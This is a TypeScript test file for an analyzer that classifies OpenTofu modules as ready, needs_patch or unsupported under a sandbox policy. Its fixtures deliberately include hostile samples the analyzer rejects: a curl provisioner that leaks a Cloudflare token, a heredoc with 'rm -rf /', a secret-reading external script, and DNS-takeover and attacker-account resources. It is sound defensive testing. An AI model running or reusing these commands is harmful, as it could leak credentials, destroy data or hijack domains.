import { expect, test } from "bun:test";

import {
  analyzeOpenTofuCapsuleFiles,
  normalizedCapsuleArtifactBody,
  normalizedModuleObjectKey,
} from "../../../../core/domains/sources/capsule_compatibility.ts";
import type { SourceSnapshot } from "takosumi-contract/sources";

const snapshot: SourceSnapshot = {
  id: "snap_test",
  sourceId: "src_test",
  url: "https://github.com/acme/service.git",
  ref: "main",
  resolvedCommit: "abc123",
  path: ".",
  archiveObjectKey:
    "spaces/space_1/sources/src_test/snapshots/snap_test/source.tar.zst",
  archiveDigest: "sha256:archive",
  archiveSizeBytes: 123,
  fetchedByRunId: "ssr_test",
  fetchedAt: "2026-06-07T00:00:00.000Z",
};

test("analyzes a reusable OpenTofu module as ready", () => {
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    aws = {
      source = "hashicorp/aws"
    }
  }
}

variable "bucket_name" {
  type = string
}

resource "aws_s3_bucket" "attachments" {
  bucket = var.bucket_name
}

output "attachments_bucket" {
  value = aws_s3_bucket.attachments.bucket
}
`,
      },
    ],
  });

  expect(result.level).toBe("ready");
  expect(result.providers).toEqual([
    {
      source: "hashicorp/aws",
      aliases: [],
      allowed: true,
    },
  ]);
  expect(result.resources).toEqual([
    { type: "aws_s3_bucket", count: 1, allowed: true },
  ]);
  expect(result.findings).toEqual([]);
});

test("treats provider-free output modules as runnable", () => {
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
variable "base_domain" {
  type = string
}

locals {
  public_origin = "https://\${var.base_domain}"
}

output "public_origin" {
  value = local.public_origin
}
`,
      },
    ],
  });

  expect(result.level).toBe("ready");
  expect(result.providers).toEqual([]);
  expect(result.resources).toEqual([]);
  expect(result.dataSources).toEqual([]);
  expect(result.provisioners).toEqual([]);
  expect(result.findings).toEqual([]);
});

test("flags auto-capsulize candidates for provider and backend lifting", () => {
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  backend "s3" {}
  required_providers {
    cloudflare = {
      source = "cloudflare/cloudflare"
      configuration_aliases = [
        cloudflare.main,
        cloudflare.zone
      ]
    }
  }
}

provider "cloudflare" {
  alias = "zone"
}

output "public_url" {
  value = "https://example.com"
}
`,
      },
    ],
  });

  expect(result.level).toBe("auto_capsulized");
  expect(result.providers).toEqual([
    {
      source: "cloudflare/cloudflare",
      aliases: ["cloudflare.main", "cloudflare.zone"],
      allowed: true,
    },
  ]);
  expect(result.findings.map((finding) => finding.code)).toContain(
    "backend_override_candidate",
  );
  expect(result.findings.map((finding) => finding.code)).toContain(
    "provider_block_lift_candidate",
  );
  expect(result.normalizedObjectKey).toBe(normalizedModuleObjectKey(snapshot));
  expect(result.normalizedDigest).toBeUndefined();
  expect(result.normalizedFiles).toHaveLength(1);
  expect(result.normalizedFiles?.[0]?.path).toBe("main.tf");
  expect(result.normalizedFiles?.[0]?.text).not.toContain('backend "s3"');
  expect(result.normalizedFiles?.[0]?.text).not.toContain(
    'provider "cloudflare"',
  );
  expect(result.normalizedFiles?.[0]?.text).toContain("required_providers");
  expect(result.normalizedFiles?.[0]?.text).toContain('output "public_url"');
  expect(
    JSON.parse(
      normalizedCapsuleArtifactBody({
        sourceSnapshot: snapshot,
        files: result.normalizedFiles!,
      }),
    ),
  ).toMatchObject({
    kind: "takosumi.normalized-capsule@v1",
    sourceSnapshotId: "snap_test",
    files: [{ path: "main.tf" }],
  });
});

test("carries non-.tf files through auto-capsulized normalization unchanged", () => {
  const migrationSql = "CREATE TABLE accounts (id TEXT PRIMARY KEY);\n";
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  backend "s3" {}
  required_providers {
    cloudflare = {
      source = "cloudflare/cloudflare"
    }
  }
}

output "public_url" {
  value = "https://example.com"
}
`,
      },
      {
        path: "migrations/001_init.sql",
        text: migrationSql,
      },
    ],
  });

  expect(result.level).toBe("auto_capsulized");
  expect(result.normalizedFiles?.map((file) => file.path)).toEqual([
    "main.tf",
    "migrations/001_init.sql",
  ]);
  const migration = result.normalizedFiles?.find(
    (file) => file.path === "migrations/001_init.sql",
  );
  expect(migration?.text).toBe(migrationSql);
  const normalizedTf = result.normalizedFiles?.find(
    (file) => file.path === "main.tf",
  );
  expect(normalizedTf?.text).not.toContain('backend "s3"');
  expect(normalizedTf?.text).toContain("required_providers");
});

test("keeps the original archive for ready capsules with non-.tf files", () => {
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    aws = {
      source = "hashicorp/aws"
    }
  }
}

resource "aws_s3_bucket" "attachments" {
  bucket = "attachments"
}

output "attachments_bucket" {
  value = aws_s3_bucket.attachments.bucket
}
`,
      },
      {
        path: "migrations/001_init.sql",
        text: "CREATE TABLE accounts (id TEXT PRIMARY KEY);\n",
      },
    ],
  });

  expect(result.level).toBe("ready");
  expect(result.normalizedFiles).toBeUndefined();
  expect(result.normalizedObjectKey).toBe(snapshot.archiveObjectKey);
  expect(result.normalizedDigest).toBe(snapshot.archiveDigest);
});

test("requires patch when provider credentials are in source", () => {
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    aws = {
      source = "hashicorp/aws"
    }
  }
}

provider "aws" {
  access_key = var.aws_access_key
}

output "public_url" {
  value = "https://example.com"
}
`,
      },
    ],
  });

  expect(result.level).toBe("needs_patch");
  expect(result.findings.map((finding) => finding.code)).toContain(
    "provider_credentials_in_source",
  );
});

test("uses explicit policy allowlists when classifying gate findings", () => {
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    policy: {
      allowedProviders: ["registry.opentofu.org/custom/provider"],
      allowedResourceTypes: ["custom_resource", "null_resource"],
      allowedDataSourceTypes: ["external"],
      allowedProvisionerTypes: ["local-exec"],
    },
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    custom = {
      source = "custom/provider"
    }
  }
}

resource "custom_resource" "ok" {}

data "external" "ok" {
  program = ["echo", "{}"]
}

resource "null_resource" "setup" {
  provisioner "local-exec" {
    command = "true"
  }
}

output "public_url" {
  value = "https://example.com"
}
`,
      },
    ],
  });

  expect(result.level).toBe("ready");
  expect(result.providers).toEqual([
    { source: "custom/provider", aliases: [], allowed: true },
  ]);
  expect(result.resources).toEqual([
    { type: "custom_resource", count: 1, allowed: true },
    { type: "null_resource", count: 1, allowed: true },
  ]);
  expect(result.dataSources).toEqual([{ type: "external", allowed: true }]);
  expect(result.provisioners).toEqual([{ type: "local-exec", allowed: true }]);
  expect(result.findings).toEqual([]);
});

test("detects dependency lockfiles without downgrading reusable modules", () => {
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: ".terraform.lock.hcl",
        text: `
provider "registry.opentofu.org/hashicorp/aws" {
  version = "5.0.0"
}
`,
      },
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    aws = {
      source = "hashicorp/aws"
    }
  }
}

resource "aws_s3_bucket" "attachments" {
  bucket = "attachments"
}

output "attachments_bucket" {
  value = aws_s3_bucket.attachments.bucket
}
`,
      },
    ],
  });

  expect(result.level).toBe("ready");
  expect(result.findings).toContainEqual({
    severity: "info",
    code: "dependency_lock_detected",
    message:
      "A provider dependency lockfile is present and will be reviewed by the provider lockfile policy after credential-free init.",
    path: ".terraform.lock.hcl",
  });
});

test("scans the reachable local module tree and ignores unrelated directories", () => {
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    aws = {
      source = "hashicorp/aws"
    }
  }
}

module "storage" {
  source = "./modules/storage"
  bucket_name = "attachments"
}

output "attachments_bucket" {
  value = module.storage.attachments_bucket
}
`,
      },
      {
        path: "modules/storage/main.tf",
        text: `
resource "aws_s3_bucket" "attachments" {
  bucket = var.bucket_name
}

variable "bucket_name" {
  type = string
}

output "attachments_bucket" {
  value = aws_s3_bucket.attachments.bucket
}
`,
      },
      {
        path: "examples/unsafe/main.tf",
        text: `
data "external" "ignored" {
  program = ["bash", "ignored.sh"]
}
`,
      },
    ],
  });

  expect(result.level).toBe("ready");
  expect(result.resources).toEqual([
    { type: "aws_s3_bucket", count: 1, allowed: true },
  ]);
  expect(result.dataSources).toEqual([]);
});

test("requires patch when a referenced local module is missing", () => {
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    aws = {
      source = "hashicorp/aws"
    }
  }
}

module "storage" {
  source = "./modules/storage"
}

output "attachments_bucket" {
  value = "placeholder"
}
`,
      },
    ],
  });

  expect(result.level).toBe("needs_patch");
  expect(result.findings.map((finding) => finding.code)).toContain(
    "local_module_source_missing",
  );
});

test("marks local module sources outside the capsule archive unsupported", () => {
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    aws = {
      source = "hashicorp/aws"
    }
  }
}

module "storage" {
  source = "../shared-storage"
}

output "attachments_bucket" {
  value = "placeholder"
}
`,
      },
    ],
  });

  expect(result.level).toBe("unsupported");
  expect(result.findings.map((finding) => finding.code)).toContain(
    "local_module_source_escapes_capsule",
  );
});

test("requires patch for filesystem-sensitive OpenTofu expressions", () => {
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    aws = {
      source = "hashicorp/aws"
    }
  }
}

resource "aws_s3_bucket" "attachments" {
  bucket = jsondecode(file("\${path.module}/bucket.json")).name
}

output "attachments_bucket" {
  value = aws_s3_bucket.attachments.bucket
}
`,
      },
    ],
  });

  expect(result.level).toBe("needs_patch");
  const filesystemFinding = result.findings.find(
    (finding) => finding.code === "filesystem_sensitive_expression",
  );
  expect(filesystemFinding).toMatchObject({
    severity: "warning",
    path: "main.tf",
  });
  expect(filesystemFinding?.message).toContain("file()");
  expect(filesystemFinding?.message).toContain("path.module");
});

test("admits standard Cloudflare data-plane resource types by default", () => {
  // Promo path: a plain Cloudflare Capsule (a Worker + its D1 / KV / Queues /
  // R2 / Pages data plane) is installable out of the box, with no curated
  // bounded InstallConfig and no explicit per-Space allowlist.
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    cloudflare = {
      source = "cloudflare/cloudflare"
    }
  }
}

resource "cloudflare_workers_script" "this" {
  account_id  = var.account_id
  script_name = var.name
  content     = var.content
}

resource "cloudflare_workers_script_subdomain" "this" {
  account_id  = var.account_id
  script_name = cloudflare_workers_script.this.script_name
  enabled     = true
}

resource "cloudflare_pages_project" "site" {
  account_id = var.account_id
  name       = var.name
}

resource "cloudflare_d1_database" "db" {
  account_id = var.account_id
  name       = var.name
}

resource "cloudflare_queue" "jobs" {
  account_id = var.account_id
  queue_name = var.name
}

resource "cloudflare_workers_kv_namespace" "cache" {
  account_id = var.account_id
  title      = var.name
}

resource "cloudflare_r2_bucket" "assets" {
  account_id = var.account_id
  name       = var.name
}

output "url" {
  value = "https://example.workers.dev"
}
`,
      },
    ],
  });

  expect(result.level).toBe("ready");
  expect(result.resources.every((resource) => resource.allowed)).toBe(true);
  expect(result.resources.map((resource) => resource.type).sort()).toEqual([
    "cloudflare_d1_database",
    "cloudflare_pages_project",
    "cloudflare_queue",
    "cloudflare_r2_bucket",
    "cloudflare_workers_kv_namespace",
    "cloudflare_workers_script",
    "cloudflare_workers_script_subdomain",
  ]);
  expect(
    result.findings.some(
      (finding) => finding.code === "resource_type_not_allowed",
    ),
  ).toBe(false);
});

test("still rejects domain-takeover Cloudflare resource types by default", () => {
  // The default allowlist deliberately excludes cross-domain / cross-tenant
  // reaching types: a DNS record (record/domain takeover) and a Worker route
  // (binds a Worker to an arbitrary hostname on a zone). These require an
  // explicit Space/InstallConfig allowlist to ever run.
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    cloudflare = {
      source = "cloudflare/cloudflare"
    }
  }
}

resource "cloudflare_dns_record" "evil" {
  zone_id = var.zone_id
  name    = "victim.example.com"
  type    = "CNAME"
  content = "attacker.example.net"
}

resource "cloudflare_workers_route" "hijack" {
  zone_id = var.zone_id
  pattern = "*.victim.example.com/*"
  script  = var.name
}

output "url" {
  value = "https://example.workers.dev"
}
`,
      },
    ],
  });

  expect(result.level).toBe("unsupported");
  const denied = result.resources.filter((resource) => !resource.allowed);
  expect(denied.map((resource) => resource.type).sort()).toEqual([
    "cloudflare_dns_record",
    "cloudflare_workers_route",
  ]);
  expect(
    result.findings.some(
      (finding) => finding.code === "resource_type_not_allowed",
    ),
  ).toBe(true);
});

test("still rejects account/zone-level Cloudflare resource types by default", () => {
  // Account/zone configuration types affect the whole account or other tenants
  // and are never in the Gateway coverage.
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    cloudflare = {
      source = "cloudflare/cloudflare"
    }
  }
}

resource "cloudflare_zone" "z" {
  account = { id = var.account_id }
  name    = "victim.example.com"
}

resource "cloudflare_account_member" "m" {
  account_id = var.account_id
  email      = "attacker@example.net"
  roles      = [var.role_id]
}

output "id" {
  value = cloudflare_zone.z.id
}
`,
      },
    ],
  });

  expect(result.level).toBe("unsupported");
  expect(result.resources.every((resource) => resource.allowed)).toBe(false);
  expect(
    result.findings.some(
      (finding) => finding.code === "resource_type_not_allowed",
    ),
  ).toBe(true);
});

test("still rejects arbitrary providers by default", () => {
  // Widening the resource-type layer does not relax the provider allowlist:
  // the default Capsule Gate coverage stays cloudflare/aws/random/tls only.
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    evil = {
      source = "acme/evil"
    }
  }
}

resource "cloudflare_r2_bucket" "ok" {
  account_id = var.account_id
  name       = var.name
}

output "url" {
  value = "https://example.workers.dev"
}
`,
      },
    ],
  });

  expect(result.level).toBe("unsupported");
  expect(result.providers).toEqual([
    { source: "acme/evil", aliases: [], allowed: false },
  ]);
  expect(
    result.findings.some((finding) => finding.code === "provider_not_allowed"),
  ).toBe(true);
});

test("marks one-touch unsafe constructs as unsupported", () => {
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    external = {
      source = "hashicorp/external"
    }
  }
}

data "external" "script" {
  program = ["bash", "read-secret.sh"]
}

resource "null_resource" "imperative" {
  provisioner "local-exec" {
    command = "echo unsafe"
  }
}

output "value" {
  value = data.external.script.result
}
`,
      },
    ],
  });

  expect(result.level).toBe("unsupported");
  expect(result.dataSources).toEqual([{ type: "external", allowed: false }]);
  expect(result.provisioners).toEqual([{ type: "local-exec", allowed: false }]);
});

test("detects provisioners hidden behind comments and ignores commented decoys", () => {
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    null = {
      source = "hashicorp/null"
    }
  }
}

# provisioner "remote-exec" {}    -> hash-comment decoy, must NOT be counted
// provisioner "file" {}          -> slash-comment decoy, must NOT be counted

resource "null_resource" "imperative" {
  /* a provisioner "chef" {} decoy inside a block comment must NOT count */
  provisioner /* c */ "local-exec" {
    command = "curl http://example.com/$CF_TOKEN"
  }
}

output "value" {
  value = null_resource.imperative.id
}
`,
      },
    ],
  });

  // The real provisioner (split across a block comment) is detected, and none
  // of the commented-out decoys (remote-exec / file / chef) are counted.
  expect(result.provisioners).toEqual([{ type: "local-exec", allowed: false }]);
  expect(result.level).toBe("unsupported");
});

test("ignores keyword-shaped tokens inside heredoc bodies", () => {
  const result = analyzeOpenTofuCapsuleFiles({
    sourceId: "src_test",
    sourceSnapshot: snapshot,
    files: [
      {
        path: "main.tf",
        text: `
terraform {
  required_providers {
    null = {
      source = "hashicorp/null"
    }
  }
}

resource "null_resource" "doc" {
  triggers = {
    note = <<-EOT
      provisioner "local-exec" { command = "rm -rf /" }
      resource "aws_iam_user" "decoy" {}
    EOT
  }
}

output "value" {
  value = null_resource.doc.id
}
`,
      },
    ],
  });

  // Nothing inside the heredoc body participates in block matching.
  expect(result.provisioners).toEqual([]);
  expect(result.resources).toEqual([
    { type: "null_resource", count: 1, allowed: false },
  ]);
});
